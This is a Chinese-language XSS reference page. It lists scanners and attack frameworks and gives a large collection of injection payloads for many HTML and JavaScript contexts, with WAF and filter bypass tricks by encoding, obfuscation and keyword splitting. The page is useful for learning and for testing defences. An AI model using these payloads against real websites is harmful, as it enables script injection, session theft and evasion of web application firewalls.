# XSS

<p align="center">
    <img src="../../../../../assets/img/banner/xss.jpg" width="65%">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [XSS 插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
- [XSS 总结](https://xz.aliyun.com/t/4067)
- [WAF的 XSS 绕过姿势](https://ha.cker.in/Article/6239)
- [他山之石 | 对 XSS 的一次深入分析认识](https://www.freebuf.com/articles/web/195507.html)
- [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)
- [深入理解浏览器解析机制和 XSS 向量编码](http://bobao.360.cn/learning/detail/292.html)
- [csp 与 bypass 的探讨(译文)](http://wutongyu.info/csp-2015/)
- [XSS绕过某盾](https://xz.aliyun.com/t/6652)
- [xss编码绕过原理以及从中学习到的几个例子](https://0verwatch.top/xss-encodeorder.html)
- [探索XSS利用编码绕过的原理](https://saucer-man.com/information_security/103.html)
- [通过XSS窃取localStorage中的JWT](http://www.arkteam.net/?p=4453)
- [坑死我的HTTPOnly](http://gv7.me/articles/2017/Session-Cookie-without-Secure-flag-set/)
- [WAF攻防实践(4)](https://mp.weixin.qq.com/s/AS1cpMqr1WkuoLmRld_p0w)
- [实战|通过恶意 pdf 执行 xss 漏洞](https://mp.weixin.qq.com/s/D1XFNR-4qg9GUkZeyMZsyw)
- [SVG based Stored XSS](https://prashantbhatkal2000.medium.com/svg-based-stored-xss-ee6e9b240dee)
- [XSS With Hoisting](https://brutelogic.com.br/blog/xss-with-hoisting/)

**相关案例**
- [BugBounty:Twitter 蠕虫 XSS](https://xz.aliyun.com/t/5050)
- [T00LS帖子正文XSS](https://www.hackersb.cn/hacker/235.html)
- [The adventures of xss vectors in curious places](https://github.com/Dliv3/Venom)
- [Avast 杀毒软件中 5000 美元的 XSS 漏洞](https://nosec.org/home/detail/3118.html)
- [组合拳出击-Self型XSS变废为宝](https://gh0st.cn/archives/2018-08-28/1)
- [Reflected XSS in graph.facebook.com leads to account takeover in IE/Edge](https://ysamm.com/?p=343)
- [XSS attacks on Googlebot allow search index manipulation](https://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/)
- [挖洞经验 | 看我如何发现亚马逊网站的反射型XSS漏洞](https://www.freebuf.com/articles/web/175606.html)
- [How I alert(1) in Azure DevOps](https://5alt.me/2019/02/xss-in-azure-devops/)
- [Stored XSS to Organisation Takeover](https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b)

**相关工具**
- [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - XSS 检测工具,效果一般
    - 依赖安装
        ```bash
        pip3 install -r requirements.txt

        wget https://github.com/mozilla/geckodriver/releases/download/v0.24.0/geckodriver-v0.24.0-linux64.tar.gz
        mkdir /usr/local/temp
        mv geckodriver /usr/local/temp
        PATH=$PATH:/usr/local/temp/
        ```
    - [Usage](https://github.com/s0md3v/XSStrike/wiki/Usage#scan-a-single-url)
        ```bash
        python3 xsstrike.py -u "http://example.com/search.php?q=query"
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --fuzzer
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --crawl
        ```
- [faizann24/XssPy](https://github.com/faizann24/XssPy) - Web 应用 XSS 扫描器
- [XSS Fuzzer](https://xssfuzzer.com/fuzzer.html) - payload 生成器
- [hahwul/dalfox](https://github.com/hahwul/dalfox) - 一款基于 Golang 开发的 XSS 参数分析和扫描工具
    ```bash
    cp dalfox /usr/bin/
    chmod +x /usr/bin/dalfox
    dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff
    dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://hahwul.xss.ht    # 单一目标模式
    dalfox file url.txt # 多目标模式，从文件读取扫描目标
    cat urls_file | dalfox pipe -H "AuthToken: bbadsfkasdfadsf87"   # 管道模式
    echo "vulnweb.com" | waybackurls | grep "=" | dalfox pipe -b https://hahwul.xss.ht
    ```

**xss 平台**
- **开源平台**
    - [firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver) - XSS 平台 CTF 工具 Web 安全工具
    - [keyus/xss](https://github.com/keyus/xss) - php 写的个人研究测试用的 xss cookie 攻击管理平台

- **在线平台**
    - http://xssye.com/index.php

- **beef**
    - 相关文章
        - [浏览器攻击框架 BeEF Part 1](https://www.freebuf.com/articles/web/175755.html)
        - [浏览器攻击框架 BeEF Part 2:初始化控制](https://www.freebuf.com/articles/web/176139.html)
        - [浏览器攻击框架 BeEF Part 3:持续控制](https://www.freebuf.com/articles/web/176550.html)
        - [浏览器攻击框架 BeEF Part 4:绕过同源策略与浏览器代理](https://www.freebuf.com/articles/web/176873.html)
        - [浏览器攻击框架 BeEF Part 5:Web应用及网络攻击测试](https://www.freebuf.com/articles/web/176912.html)

        默认端口为 3000,默认路径是`/ui/authentication`,默认用户名和密码 beef

**在线测试**
- http://demo.testfire.net/
- https://juice-shop.herokuapp.com/#/search
- https://xsschop.chaitin.cn/demo/

**靶场**
- [XSS 挑战-WalkThrough](../靶场/XSS挑战-WalkThrough.md)

**payload**
- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
- [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [aurebesh.js – Translate JavaScript to Other Writing Systems](https://aem1k.com/aurebesh.js/)

**Tips**
- **Firefox 关闭 xss 过滤器**

    about:config 把 rowser.urlbar.filter.javascript 改为 false

- **chrome 关闭 xss 过滤器**

    带参数启动 --args --disable-xss-auditor

---

# 基础

## 什么是 XSS

跨站点脚本 (XSS) 攻击是一种注入，Web 程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了 HTML 页面的原有逻辑，攻击者可以利用该漏洞执行恶意 HTML/JS 代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。

XSS 攻击有 3 种类型：

- 反射型 XSS : 通过网络浏览器从另一个网站运行恶意脚本的攻击
- 存储型 XSS : 存储型是将注入的脚本永久存储在目标服务器上的攻击
- 基于DOM的XSS : 一种在 DOM 结构中而不是在 HTML 代码中触发的 XSS。

## XSS Payload

### 最基础的
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

### 在标签内部的
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)

"><script>alert(1)</script>
'><script>alert(1)</script>

</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>

</script><script>alert(1)</script>
```

示例1
```html
<input id="keyword" type="text" name="q" value="example">
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

示例2
```html
<input id="keyword" type="text" name="q" value="example">
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

示例3
```html
<a href="https://target.com/1?status=example">1</a>
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

示例4
```html
<script>
    var sitekey = 'example';
</script>

<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```

**通过注释转义的**
```html
--><script>alert(1)</script>
<!-- --><script>alert(1)</script> -->
```

**在 script 中**
```js
'-alert(1)-'
'/alert(1)//
```

示例
```html
<script>
    var sitekey = 'example';
</script>

<script>
    var sitekey = ''-alert(1)-'';
</script>
```

**在 script 中,但输出在字符串分隔值内，引号被反斜杠转义**
```js
\'alert(1)//
```

示例
```html
<script>
    var sitekey = 'example';
</script>

<!-- 使用 -alert(1)- 的结果 -->
<script>
    var sitekey = '\'-alert(1)-\'';
</script>

<!-- 绕过反斜杠转义 -->
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

**一行 JS 内多个值**
```js
/alert(1)//\
/alert(1)}//\
```

示例
```html
<script>
    var a = 'example'; var b = 'example';
</script>

<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

**条件控制语句内的值**
```js
'}alert(1);{'
\'}alert(1);{//
```

示例
```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'example';
  }
</script>

<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

**反引号内的值**
```js
${alert(1)}
```

示例
```html
<script>
    var dapos = `example`;
</script>

<script>
    var dapos = `${alert(1)}`;
</script>
```

### 用在其他功能点

**文件名**
```
"><svg onload=alert(1)>.png
```

**exif 数据**
```bash
exiftool -Artist='"><script>alert(1)</script>' test.jpeg
```

**SVG**
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**markdown**
```
[Click Me](javascript:alert('1'))
```

**xml**
```xml
<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
```

---

# Bypass

1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等;
2. 如果过滤闭合标签,尝试无闭合标签的 payload `<b,<i,<marquee` 观察响应;

## 长度限制

**绕过长度限制**
```js
"onclick=alert(1)//
"><!--
--><script>alert(xss);<script>
```

## 内容检测

**换行**
```js
<img src=1
onerror
=alert(1)
```

**过滤空格,用 / 代替空格**
```js
<img/src="x"/onerror=alert("xss");>
```

**过滤关键字,大小写绕过**
```html
<ImG sRc=x onerRor=alert("xss");>
<scRiPt>alert(1);</scrIPt>
```

**不闭合**
```js
<svg onload="alert(1)"
```

**拼接**
```js
<details open ontoggle=top['al'%2B'ert'](1) >
```

**双写关键字**

有些 waf 可能会只替换一次且是替换为空,这种情况下我们可以考虑双写关键字绕过
```js
<imimgg srsrcc=x onerror=alert("xss");>
```

**替换绕过**

过滤 alert 用 prompt,confirm,top['alert'](1) 代替绕过
过滤 () 用 ``代替绕过
过滤空格 用 %0a(换行符),%0d(回车符),/**/ 代替绕过
小写转大写情况下 字符 ſ 大写后为 S(ſ 不等于 s)

**利用 eval**
```js
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
```

**利用 top**
```js
<script>top["al"+"ert"](`xss`);</script>
```

**%00截断绕过**
```js
<a href=javascr%00ipt:alert(1)>xss</a>
```

**其它字符混淆**

有的 waf 可能是用正则表达式去检测是否有 xss 攻击,如果我们能 fuzz 出正则的规则,则我们就可以使用其它字符去混淆我们注入的代码了,举几个简单的例子

可利用注释、标签的优先级等
```js
<<script>alert("xss");//<</script>
<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为 title 标签的优先级比 img 的高,所以会先闭合 title,从而导致前面的 img 标签无效
<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```

**编码绕过**
```js
实体编码
javascrip&#x74;:alert(1) 十六进制
javascrip&#116;:alert(1) 十进制

Unicode编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">

url编码绕过
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">

<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii码绕过
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">

hex绕过
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制
<img src=x onerror=alert('\170\163\163')>

base64绕过
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

**过滤双引号,单引号**

```js
1.如果是html标签中,我们可以不用引号.如果是在js中,我们可以用反引号代替单双引号
<img src="x" onerror=alert(`xss`);>
2.使用编码绕过,具体看上面我列举的例子,我就不多赘述了
```

```js
过滤括号
当括号被过滤的时候可以使用throw来绕过
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

```js
过滤url地址
使用url编码
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>

使用IP
1.十进制IP
<img src="x" onerror=document.location=`http://2130706433/`>

2.八进制IP
<img src="x" onerror=document.location=`http://0177.0.0.01/`>

3.hex
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>

4.html标签中用//可以代替http://
<img src="x" onerror=document.location=`//www.baidu.com`>

5.使用\\
但是要注意在windows下\本身就有特殊用途,是一个path 的写法,所以\\在Windows下是file协议,在linux下才会是当前域的协议

6.使用中文逗号代替英文逗号
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
<img src="x" onerror="document.location=`http://www.baidu.com`">//会自动跳转到百度
```

```js
fromCharCode方法绕过
String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)
eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
```

**javascript 伪协议绕过**

无法闭合双引号的情况下,就无法使用 onclick 等事件,只能伪协议绕过,或者调用外部 js
```js
注释符
// 单行注释
<!-- --!> 注释多行内容
<!-- --> 注释多行内容
<-- --> 注释多行内容
<-- --!> 注释多行内容
--> 单行注释后面内容
/* */ 多行注释
有时还可以利用浏览器的容错性,不需要注释
```

```js
闭合标签空格绕过
</style ><script>alert(1)</script>
```

```
@ 符号绕过 url 限制
例如:https://www.segmentfault.com@xss.haozi.me/j.js
其实访问的是 @ 后面的内容
```

```
") 逃逸函数后接分号
例:");alert(1)//
```

```
绕过转义限制
例:
\")
alert(1) //
```

**输入会被大写化**

先把纯文本字符转换为 HTML 实体字符, 然后对其进行 URL 编码, 最后用 SVG 标记的 onload 参数输出
```html
<svg onload=%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x27%3B%26%23x48%3B%26%23x69%3B%26%23x20%3B%26%23x4D%3B%26%23x6F%3B%26%23x6D%3B%26%23x27%3B%26%23x29%3B>
```
